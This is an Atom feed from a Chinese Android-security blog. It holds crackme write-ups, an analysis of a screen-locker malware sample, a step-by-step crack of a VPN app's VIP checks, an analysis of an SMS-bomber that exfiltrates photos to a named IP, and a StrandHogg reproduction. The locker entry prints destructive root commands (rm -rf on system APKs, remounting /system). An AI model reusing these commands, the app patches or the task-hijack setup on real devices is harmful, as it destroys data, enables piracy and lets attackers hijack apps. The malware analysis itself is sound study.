<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-29T08:31:14.473Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>赤座灯里 Android逆向合集</title>
    <link href="http://example.com/posts/a2a00c21.html"/>
    <id>http://example.com/posts/a2a00c21.html</id>
    <published>2022-11-25T08:05:24.368Z</published>
    <updated>2022-11-29T08:31:14.473Z</updated>
    
    <content type="html"><![CDATA[<p>来自吾爱论坛里的赤座灯里牛牛出的Android题，出的题都太有水平了，不会做（笑死）。</p><span id="more"></span><h1 id="1-一枚安卓Crackme"><a href="#1-一枚安卓Crackme" class="headerlink" title="1. 一枚安卓Crackme"></a>1. 一枚安卓Crackme</h1><p>看到MainActivity的代码流程，第一思路就是逆向算法。</p><p>发现还是错误。查看一下布局发现输入框是这个输入框，但是按钮的id却不相等，也就是说正确的按钮根本不是MainActivity中的按钮，自然不会走该按钮的逻辑。</p><p>搜索“R.id.v”无果，仔细看MainActivity发现它继承的是Activity类，而不是我们经常看到的AppCompatActivity。进去Activity发现暗藏玄机，几乎所有代码都在<code>lib0.0.so</code>中实现。</p><p>进入<code>lib0.0.so</code>文件，查找使用Native层实现的<code>setContentView()</code>，按钮id对应上了。</p><p>在内部类中做了一个初始化操作，查看字节数组发现是变种Base64。</p><p><code>onClick()</code>也是使用JNI实现的。</p><p>往下拉提示解密过后的字符串为<code>52pojie2020CM</code>。</p><p>中间就是加密过程了，泻药真的看不懂算法。这其实是Base64逆算法。</p><p>但从掌握的信息就可以猜到应该是输入的字符串通过变种Base64解密后得到<code>52pojie2020CM</code>。</p><h1 id="2-丢个大佬萌秒破的CM"><a href="#2-丢个大佬萌秒破的CM" class="headerlink" title="2. 丢个大佬萌秒破的CM"></a>2. 丢个大佬萌秒破的CM</h1><p>这回可不能给它骗了。</p><p>在输入框中输入“Congratulations~!”加载So文件，执行So中的<code>x()</code>方法。接下来进入So世界。</p><p>因为我的手机的是arm64-v8a架构的，所以使用的是资源id为0x7f0c0001，但它的资源名实在是太大众化了，那就直接查看<code>res/raw/</code>目录下的文件，有两个文件，一个是x.y，另一个是y.z。盲猜一个是32位另一个是64位。将两个文件分别以二进制的形式与0xA进行异或，得到是ELF文件格式。使用IDA打开知道y.z是64位ELF文件。查找<code>xx()</code>方法无果，看<code>JNI_OnLoad()</code>。据说看代码可以看出来解密后的So文件在<code>/data/user/0/com.akari.crackme/cache/</code>中，以输入的字符串命名。但我看不出来，谢。</p><p>在输入框中输入“WELL_DONE~!”还是不对。再看回<code>JNI_OnLoad()</code>，原来它还做了一个RC4加密操作。RC4加密需要密码，所以密码在哪，那个初始化是对“vvvvvvvv”进行加密操作吗？有牛牛还说将加密结果转成了十六进制，我真看不出来啊。</p><h1 id="3-找自信CM"><a href="#3-找自信CM" class="headerlink" title="3. 找自信CM"></a>3. 找自信CM</h1><p>先略过<code>onClick()</code>，看完<code>onCreate()</code>，它还加载了一个So库，调用了JNI层的<code>showPic()</code>方法。</p><p>这个path肯定不是<code>sub_5018()</code>中的path，肯定还经过一些修改。那在执行<code>showPic()</code>函数之前，肯定经过了<code>JNI_OnLoad()</code>，查看一下它做了什么。</p><p>猜测在图片中有一个加密的So库，将这个So拿出来。</p><p>由于实在不知道它的偏移是多少，所以先对整个JPG文件的字节流按位取反，再搜索ELF文件头找到这个So。原来它的偏移是0x13195。</p><p>已知ELF文件头的偏移与ELF文件的大小，可以计算得出，从0x13195到0x17771都是ELF文件的内容。将它拷贝出来使用IDA打开即可。</p><p>回看<code>showPic()</code>函数，它调用了这个So的<code>$()</code>函数。这个So没有<code>JNI_OnLoad()</code>，所以直接看<code>$()</code>。原来<code>$()</code>就是<code>JNI_OnLoad()</code>。</p><p>我傻掉了，不会是动态加载函数吧。根据字符串稀里糊涂地被我找到了一处，但是还有些字符串不知道去了哪里。</p><p>也就是<code>check()</code>的返回值是666，因此byte_5084一定为false，它说它自己是char类型啊喂？</p><p>…然后呢？？尝试hook times变量绕过if判断，使用Frida调试时发现出错，一开始还以为是程序自己的So库与系统So库同名导致的，但修改So库名称后还是出现同样的错误，后来怀疑是反调试，但在我们分析的过程中并没有遇到反调试。查资料说有可能是Android 8.1.0系统的问题，把系统刷回7.1.1完美解决。但我们咋办…</p><p>很想知道当times为666时，输入666会怎么样呢？</p><h1 id="4-找自信安卓CM"><a href="#4-找自信安卓CM" class="headerlink" title="4. 找自信安卓CM"></a>4. 找自信安卓CM</h1><p>在导出表中并没有找到<code>eq()</code>函数，所以很可能在<code>JNI_OnLoad()</code>中动态注册。进入<code>JNI_OnLoad()</code>，发现它进行了<code>ptrace()</code>反调试。如果检测到调试器则进入假函数中。</p><p>我们去真函数中看一下。</p><p>这个算法应该看懂了，它的意思就是将输入的字符串以“-”分割成三块，这三块要符合以下条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v11[0] ^ 5 + v11[1] ^ 5 == v11[2] ^ 5</span><br></pre></td></tr></table></figure><p>这个只能遍历了。遍历了一下午…去找了预备役数学老师，发现根本没有这样的正整数好吗，这是费马大定理啊！</p><p>也就是说这个条件是不成立的，我们找错地方了。</p><p>如果实在看不懂它的算法就只能通过hook <code>ptrace()</code>将它的返回值修改为0，使得执行流程转到真函数中再进行动态调试。（不过这道题动态调试也并没有什么用，本质还是逆算法）</p><p>如何hook <code>ptrace()</code>函数成为我们要关注的对象。</p><p>首先<code>ptrace()</code>函数应该是在<code>libc.so</code>中，编写js脚本通过frida找到<code>ptrace()</code>在内存中的地址。可以看到有两个，其中<code>ptrace()</code>调用的就是<code>__ptrace()</code>，在上面的源码中也能看到。</p><p>我们应该不需要深入到<code>__ptrace()</code>，那就直接hook <code>ptrace()</code>，</p><p>返回值为-1，刚好对应上我们在IDA看到如果小于等于-1则进入FAKE FUNCTION中。那现在直接将函数的返回值置为0，在IDA中去到真和假函数的起始处分别下断点。</p><p>使用frida的spawn模式启动App，因为<code>ptrace()</code>在程序启动时就已经进行检测了。使用IDA进行调试。在启动时遇到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">armlinux debugger: more than one special register present</span><br></pre></td></tr></table></figure><p>一般是server端不匹配，选择android_server就可以用了。</p><p>当被检测到<code>ptrace()</code>小于等于-1时，会去到off_1DB4中。</p><p>救命无论怎么都去到假函数咋办，我脚本写错了吗</p><h1 id="5-萌新发个有奖安卓cm"><a href="#5-萌新发个有奖安卓cm" class="headerlink" title="5. 萌新发个有奖安卓cm"></a>5. 萌新发个有奖安卓cm</h1><p>这里继承的Activity并没有找到，应该是没做什么吧。</p><p>先踩一下坑。被调戏了。</p><p>后面不知道怎么做了。楼主写了<a href="https://www.52pojie.cn/thread-1190436-1-1.html">WP</a> ，看不懂就是了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;来自吾爱论坛里的赤座灯里牛牛出的Android题，出的题都太有水平了，不会做（笑死）。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Reverse" scheme="http://example.com/tags/Reverse/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>彼岸花三层锁分析</title>
    <link href="http://example.com/posts/8a01ecfc.html"/>
    <id>http://example.com/posts/8a01ecfc.html</id>
    <published>2022-11-20T05:15:35.382Z</published>
    <updated>2022-11-26T15:23:49.944Z</updated>
    
    <content type="html"><![CDATA[<p>貌似还没有分析过一个锁机病毒，来尝试一下。这个APK应该是用彼岸花锁机生成器制作的？要不然为什么要这样叫它。</p><span id="more"></span><img src="/posts/8a01ecfc/1.1.png" class=""><img src="/posts/8a01ecfc/1.2.png" class=""><p>这个应用伪装成手机上的通讯录App。</p><img src="/posts/8a01ecfc/1.3.png" class=""><h1 id="1-第一层锁机"><a href="#1-第一层锁机" class="headerlink" title="1. 第一层锁机"></a>1. 第一层锁机</h1><p>启动该应用后，会将手机声音调至最大并持续振动，发出不可描述的声音。救命，我用的真机啊。抓包并没有抓到什么，所以所有加解密操作都应该在这个App里面了。接下来就直接分析App吧。入口为MainActivity，那么就直接进入。</p><img src="/posts/8a01ecfc/1.4.png" class=""><p>它启动了一个服务，进入MyService。</p><img src="/posts/8a01ecfc/1.5.png" class=""><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GG()函数的功能是删除file下的所有文件，重命名为DeleteFile  </span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">GG</span><span class="params">(File file)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (File file2 : file.listFiles()) &#123;</span><br><span class="line">            GG(file2);</span><br><span class="line">        &#125;</span><br><span class="line">        file.delete();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">        file.delete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/8a01ecfc/1.6.png" class=""><p>进去看看如何实现封锁USB接口的。</p><img src="/posts/8a01ecfc/1.7.png" class=""><p>将<code>persist.sys.usb.config</code>置为none，在Windows中写入注册表项禁用USB接口，APK怎么能在Windows上写东西呢？</p><p>继续往下看if语句：</p><img src="/posts/8a01ecfc/1.9.png" class=""><img src="/posts/8a01ecfc/2.1.png" class=""><p>这个逻辑明显有问题，switch里面的参数不能是boolean类型。应该是Smali代码转成Java代码出错了，这时候可以更换反编译器或者直接看Smali代码。</p><p>jeb也太香了吧！还自动帮我们解码，上面的sdcard/和resume、resin都帮我们算出来了。回归正题，我们发现原来switch中根本不是boolean类型，而是int类型。</p><img src="/posts/8a01ecfc/2.2.png" class=""><p>修改一下case的值就差不多了，得到一个二维数组。</p><img src="/posts/8a01ecfc/2.3.png" class=""><p>继续往下看for循环：</p><img src="/posts/8a01ecfc/2.4.png" class=""><img src="/posts/8a01ecfc/2.5.png" class=""><img src="/posts/8a01ecfc/2.6.png" class=""><p>ck就是[0,100000)的随机数，而识别码就是由它加密而成的。跑一下发现识别码就是ck本身，但要注意识别码是String类型，而ck是int类型。</p><img src="/posts/8a01ecfc/2.7.png" class=""><p>继续看<code>sb()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">sb</span><span class="params">(<span class="type">int</span> i)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i;</span><br><span class="line">    <span class="keyword">if</span> (i2 &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> i2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">65537</span> / i2;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">65537</span> % i2;</span><br><span class="line">    <span class="keyword">while</span> (i5 != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2 / i5;</span><br><span class="line">        i2 %= i5;</span><br><span class="line">        i3 = (i3 + (i4 * i6)) &amp; <span class="number">65530</span>;</span><br><span class="line">        <span class="keyword">if</span> (i2 == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> i5 / i2;</span><br><span class="line">        i5 %= i2;</span><br><span class="line">        i4 = (i4 + (i3 * i7)) &amp; <span class="number">65531</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">1</span> - i4) &amp; <span class="number">65532</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个直接复制求结果就好。当我们假定一个ck后，试一下执行得到我们需要输入密码。</p><img src="/posts/8a01ecfc/2.8.png" class=""><img src="/posts/8a01ecfc/2.9.png" class=""><p>特别奇怪是不是，一个根本得不到密码，另一个出来了非常多的密码。捋一下程序的逻辑，它一共执行了两次大循环，第一次是resume，第二次是resin。每个大循环里面又执行了4次中循环，中循环里面执行了5次小循环。所以按理来说，一个随机数可以得到40个密码。到底哪一个密码才能正确解密呢？</p><p>我们知道这个第一层锁机函数<code>L()</code>是在<code>onCreate()</code>函数中的，应用程序呈现给用户看到的界面已经是执行完<code>onCreate()</code>后的事情了，所以正确的密码应该是最后一个。那为什么作者要设计这么“多余”的内容呢？我猜应该是用来迷惑人的，增加逆向者的工作量。</p><p>那么第一层锁机就被我们破解了，我们只需知道识别码就可以得到正确密码解锁。</p><h1 id="2-第二层锁机"><a href="#2-第二层锁机" class="headerlink" title="2. 第二层锁机"></a>2. 第二层锁机</h1><p>第二层的整体结构与第一层差不多，而且还比第一层简单，直接将代码复制下来跑一遍就得到密码了。</p><img src="/posts/8a01ecfc/3.1.png" class=""><img src="/posts/8a01ecfc/3.2.png" class=""><img src="/posts/8a01ecfc/3.3.png" class=""><img src="/posts/8a01ecfc/3.4.png" class=""><h1 id="3-第三层锁机"><a href="#3-第三层锁机" class="headerlink" title="3. 第三层锁机"></a>3. 第三层锁机</h1><img src="/posts/8a01ecfc/4.1.png" class=""><img src="/posts/8a01ecfc/4.4.png" class=""><p><code>canSU()</code>里面是什么呢？进去看看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canSU</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> canSU(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canSU</span><span class="params">(<span class="type">boolean</span> z)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.can_su == <span class="literal">null</span> || z) &#123;</span><br><span class="line">        <span class="type">CommandResult</span> <span class="variable">runWaitFor</span> <span class="operator">=</span> <span class="built_in">this</span>.su.runWaitFor(<span class="string">&quot;mount -o rw,remount /system&quot;</span>, <span class="string">&quot;rm -rf /system/priv-app/cx.apk&quot;</span>, <span class="string">&quot;rm -rf /system/app/cx.apk&quot;</span>, <span class="string">&quot;mv /system/app/youqing /system/usr/keylayout&quot;</span>, <span class="string">&quot;mv /system/priv-app/hlx /system/priv-app/Settings&quot;</span>, <span class="string">&quot;reboot&quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">if</span> (runWaitFor.stdout != <span class="literal">null</span>) &#123;</span><br><span class="line">            sb.append(runWaitFor.stdout).append(<span class="string">&quot; ; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (runWaitFor.stderr != <span class="literal">null</span>) &#123;</span><br><span class="line">            sb.append(runWaitFor.stderr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.can_su = <span class="keyword">new</span> <span class="title class_">Boolean</span>(runWaitFor.success());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.can_su.booleanValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CommandResult <span class="title function_">runWaitFor</span><span class="params">(String... strArr)</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">run</span> <span class="operator">=</span> run(strArr);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (run != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                num = <span class="keyword">new</span> <span class="title class_">Integer</span>(run.waitFor());</span><br><span class="line">                str = getStreamLines(run.getInputStream());</span><br><span class="line">                str2 = getStreamLines(run.getErrorStream());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException e2) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CommandResult</span>(<span class="built_in">this</span>.<span class="built_in">this</span>$<span class="number">0</span>, num, str, str2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Process <span class="title function_">run</span><span class="params">(String... strArr)</span> &#123;</span><br><span class="line">        Process process;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(<span class="built_in">this</span>.SHELL);</span><br><span class="line">            <span class="type">DataOutputStream</span> <span class="variable">dataOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(process.getOutputStream());</span><br><span class="line">            <span class="keyword">for</span> (String str : strArr) &#123;</span><br><span class="line">                <span class="keyword">if</span> (str != <span class="literal">null</span>) &#123;</span><br><span class="line">                    dataOutputStream.write(str.getBytes());</span><br><span class="line">                    dataOutputStream.write(<span class="string">&quot;\n&quot;</span>.getBytes());</span><br><span class="line">                    dataOutputStream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dataOutputStream.writeBytes(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line">            dataOutputStream.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            process = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> process;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>mount -o rw,remount /system</code>：以可读写的方式加载/system分区。</p><p><code>rm -rf /system/priv-app/cx.apk</code>：强制删除系统核心应用 <code>cx.apk</code>。</p><p><code>rm -rf /system/app/cx.apk</code>：强制删除系统核心应用 <code>cx.apk</code>。</p><p><code>mv /system/app/youqing /system/usr/keylayout</code>：将/system/app/youqing移动到/system/usr/keylayout。</p><p><code>mv /system/priv-app/hlx /system/priv-app/Settings</code>：将hlx重命名为Settings。</p><p><code>reboot</code>：重启。</p><p>/system/priv-app 中包括 Launcher，SystemUI，SettingsProvider 等，均是系统的核心应用，这些应用能使用系统级的权限，4.4 之前的所有 /system/app 下的软件都能使用系统级的权限，Google 这样做是把内置到系统的应用也做个级别的区别。放到 /system/priv-app 下的应用比放到 /system/app 下的应用可以声明获得更多的权限。</p><p>我们在之前的分析中并没有发现应用程序在这些地方执行过命令，所以<code>canSU()</code>我们是不希望执行的。因此第三层的密码算法应该是<code>&quot;&quot; + (v1 ^ cz)</code>。</p><p>同样复制代码修改一下就可以求得v1的值，进而得到密码。</p><img src="/posts/8a01ecfc/4.3.png" class=""><p>需要注意的是<code>letterToNumber()</code>在jeb中反编译错误，而Jadx中是正确的。看来还是不能盲目相信一个反编译器的编译结果。</p><img src="/posts/8a01ecfc/4.2.png" class=""><p>去除浮窗后还是不停振动并发出不可描述的声音，赶紧把应用程序卸载即可，但被删除的文件找不回来了。</p><p>如果手机没有进行root，这个锁机软件在需要root权限的一些操作就可以避免，比如读写/system分区、强制删除系统APK等。由于现在的手机都默认没有root权限，所以锁机病毒几乎都灭绝了吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;貌似还没有分析过一个锁机病毒，来尝试一下。这个APK应该是用彼岸花锁机生成器制作的？要不然为什么要这样叫它。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>旋风加速器 v7.0.7分析</title>
    <link href="http://example.com/posts/cb405f21.html"/>
    <id>http://example.com/posts/cb405f21.html</id>
    <published>2022-11-19T03:16:07.627Z</published>
    <updated>2022-11-20T01:25:12.119Z</updated>
    
    <content type="html"><![CDATA[<p>单纯好奇一下这个App。</p><span id="more"></span><p>扔进沙箱检测一下。</p><img src="/posts/cb405f21/1.5.png" class=""><img src="/posts/cb405f21/1.1.png" class=""><p>传输的内容被加密了，可以尝试使用r0capture脚本进行抓包。但很遗憾出来的还是密文。</p><img src="/posts/cb405f21/1.4.png" class=""><p>使用账号登录或手机登录注册时发现手机号与密码明文传输，并且使用GET请求。</p><img src="/posts/cb405f21/1.3.png" class=""><img src="/posts/cb405f21/1.2.png" class=""><p>总的来说这个App并没有在背后搞什么小动作。那现在我们尝试一下破解它。这个程序没有加壳，直接载入jadx分析。</p><p>非VIP用户点击中间的启动按钮时会弹出一个NAG，点击“继续连接”使用免费线路，点击“切换线路”会去到开通VIP页面。</p><img src="/posts/cb405f21/2.1.png" class=""><p>在jadx中搜索关键字，进入发现有个关键函数<code>isVip()</code>。</p><img src="/posts/cb405f21/2.2.png" class=""><p>我们只需将这个函数的返回值恒定为true即可。</p><img src="/posts/cb405f21/2.4.png" class=""><img src="/posts/cb405f21/2.5.png" class=""><p>抓包发现GET请求也默认我们是VIP用户，此时点击启动按钮时会强制我们切换线路，而如果我们选择切换线路时又会弹出一个说我们没有登录的NAG。</p><img src="/posts/cb405f21/2.6.png" class=""><img src="/posts/cb405f21/2.3.png" class=""><p>同样方法hook <code>isLogin()</code>函数：</p><img src="/posts/cb405f21/2.7.png" class=""><p>啊哈，这个NAG在上上上图已经框出来了，它的校验函数是<code>getEnable()</code>，所以也将它hook上。</p><img src="/posts/cb405f21/1.7.png" class=""><img src="/posts/cb405f21/2.8.png" class=""><p>这样就能切换到其它线路了。还有一个问题，VIP是不限时长的，但我们发现我们在使用过程中时长还是会减少。同样搜索关键字定位到关键代码，只要修改Smali代码使它绕过这个if语句即可。</p><img src="/posts/cb405f21/3.5.png" class=""><p>以下是破解过程：</p><p>修改<code>isLogin()</code>：</p><img src="/posts/cb405f21/3.1.png" class=""><p>修改<code>isVip()</code>：</p><img src="/posts/cb405f21/3.2.png" class=""><img src="/posts/cb405f21/3.3.png" class=""><p>修改<code>getEnable()</code>：</p><img src="/posts/cb405f21/3.4.png" class=""><p>修改if语句的执行逻辑：</p><img src="/posts/cb405f21/3.6.png" class=""><p>最终效果图：</p><img src="/posts/cb405f21/3.7.png" class=""><p>使用过程中会弹出“节点配置加载失败”，呃…弄了一天结果不能用，笑死。可能是因为虽然客户端改了，但服务端的确没有对应的消息，所以才会失败。所以很多破解软件都是采用离线注册的方式才能成功。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;单纯好奇一下这个App。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>炸鸡 v2.0分析</title>
    <link href="http://example.com/posts/a033ff75.html"/>
    <id>http://example.com/posts/a033ff75.html</id>
    <published>2022-11-18T02:32:26.232Z</published>
    <updated>2022-11-26T15:34:00.424Z</updated>
    
    <content type="html"><![CDATA[<p>短信轰炸App分析。</p><span id="more"></span><p>扔进沙箱查看该App都做了什么。在权限设置中可以看到读写SD卡权限、还有获取电话状态权限。</p><img src="/posts/a033ff75/1.2.png" class=""><img src="/posts/a033ff75/1.3.png" class=""><img src="/posts/a033ff75/1.4.png" class=""><p>运行App，进行抓包，在授予App访问存储空间权限时，发现它在偷SD卡的所有ZIP包、照片和视频。ZIP包上传到 <a href="http://101.35.248.246/%e5%9b%be%e7%89%87/%e7%85%a7%e7%89%87/%e7%85%a7%e7%89%87.php">http://101.35.248.246/%e5%9b%be%e7%89%87/%e7%85%a7%e7%89%87/%e7%85%a7%e7%89%87.php</a> ，照片上传到 <a href="http://101.35.248.246/%e5%9b%be%e7%89%87/%e7%85%a7%e7%89%87/%e7%85%a7%e7%89%87.php">http://101.35.248.246/%e5%9b%be%e7%89%87/%e7%85%a7%e7%89%87/%e7%85%a7%e7%89%87.php</a> 。</p><img src="/posts/a033ff75/1.1.png" class=""><img src="/posts/a033ff75/1.8.png" class=""><p>点击“开启轰炸”，发现该App把电话号码传到各个网站的注册登录页面，向该电话号码发送验证码短信。</p><img src="/posts/a033ff75/1.5.png" class=""><p>电话号查QQ或QQ查电话号不知道如何实现的，可以进一步分析App。</p><img src="/posts/a033ff75/1.6.png" class=""><p>这个App貌似做了360加固，但你又可以找到对应的Activity，虽然这些Activity好像少了很多东西。查看App里的LUA文件发现也被加密了。（使用FART脱壳后函数体更难看了）</p><img src="/posts/a033ff75/1.7.png" class=""><img src="/posts/a033ff75/1.9.png" class=""><p><a href="https://baike.baidu.com/item/lua/7570719?fr=aladdin">LUA</a> 是一种轻量小巧的脚本语言，用标准C语言编写并以源代码形式开放， 其设计目的是为了嵌入应用程序中，从而为应用程序提供灵活的扩展和定制功能。<a href="https://www.runoob.com/lua/lua-tutorial.html">LUA教程</a></p><p>说实话不太懂，但我们知道这个App可以做几件事：</p><ol><li>盗取<code>/sdcard</code>目录下的所有ZIP包</li><li>通过QQ号或手机号查找绑定的手机号或QQ（这个不知道可不可行，反正我试了不可行）</li><li>对目标手机号进行短信轰炸</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;短信轰炸App分析。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="样本分析" scheme="http://example.com/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Android StrandHogg漏洞复现</title>
    <link href="http://example.com/posts/25a1b417.html"/>
    <id>http://example.com/posts/25a1b417.html</id>
    <published>2022-11-02T07:47:28.017Z</published>
    <updated>2022-11-17T06:25:14.966Z</updated>
    
    <content type="html"><![CDATA[<p>StrandHogg是一个 Android 任务栈劫持漏洞，属于应用层漏洞。</p><p>参考文章：<a href="https://bbs.pediy.com/thread-271459.htm">Android strandhogg漏洞复现学习</a></p><span id="more"></span><p>Activity属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> </span></span><br><span class="line"><span class="tag"><span class="attr">android:name</span>=<span class="string">&quot;.inject_activity&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:allowTaskReparenting</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:taskAffinity</span>=<span class="string">&quot;com.xx.mm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>taskAffinity（任务相似性）：用来标识Activity与任务的联系，该属性如果没有被设置，就从自身的 Application 继承，Application 